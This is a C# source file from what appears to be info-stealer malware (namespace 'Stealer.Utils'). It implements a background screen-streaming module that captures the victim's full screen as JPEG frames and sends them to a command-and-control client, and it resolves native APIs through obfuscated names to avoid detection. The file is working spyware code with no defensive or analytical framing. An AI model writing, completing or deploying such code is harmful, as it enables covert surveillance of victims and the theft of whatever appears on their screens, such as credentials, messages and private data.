using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;

namespace Stealer.Utils
{
    public static class ScreenStream
    {
        private static Thread _captureThread;
        private static volatile bool _running;

        public static void Start(int fps, int quality)
        {
            if (_running) return;
            _running = true;
            _captureThread = new Thread(() => CaptureLoop(fps, quality)) { IsBackground = true };
            _captureThread.Start();
        }

        public static void Stop()
        {
            _running = false;
        }

        private static void CaptureLoop(int fps, int quality)
        {
            int delay = 1000 / Math.Max(fps, 1);

            var jpegEncoder = GetJpegEncoder();
            var qualityParam = new EncoderParameters(1);
            qualityParam.Param[0] = new EncoderParameter(Encoder.Quality, (long)Math.Max(10, Math.Min(quality, 100)));

            while (_running)
            {
                try
                {
                    byte[] frameData = CaptureScreen(jpegEncoder, qualityParam);
                    if (frameData != null)
                    {
                        C2Client.SendBinary(frameData);
                    }
                }
                catch { }
                Thread.Sleep(delay);
            }
        }

        private static byte[] CaptureScreen(ImageCodecInfo encoder, EncoderParameters encParams)
        {
            try
            {
                int w = GetScreenWidth();
                int h = GetScreenHeight();
                if (w <= 0 || h <= 0) return null;

                using (var bmp = new Bitmap(w, h, PixelFormat.Format24bppRgb))
                {
                    using (var g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, new Size(w, h), CopyPixelOperation.SourceCopy);
                    }
                    using (var ms = new MemoryStream())
                    {
                        bmp.Save(ms, encoder, encParams);
                        return ms.ToArray();
                    }
                }
            }
            catch
            {
                return null;
            }
        }

        private static int GetScreenWidth()
        {
            var getMetrics = NativeLoader.Resolve<GetSystemMetricsDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_GSM);
            return getMetrics != null ? getMetrics(0) : 1920;
        }

        private static int GetScreenHeight()
        {
            var getMetrics = NativeLoader.Resolve<GetSystemMetricsDelegate>(NativeLoader.Lib_U32, NativeLoader.Fn_GSM);
            return getMetrics != null ? getMetrics(1) : 1080;
        }

        private delegate int GetSystemMetricsDelegate(int nIndex);

        private static ImageCodecInfo GetJpegEncoder()
        {
            foreach (var codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.MimeType == "image/jpeg") return codec;
            }
            return null;
        }
    }
}
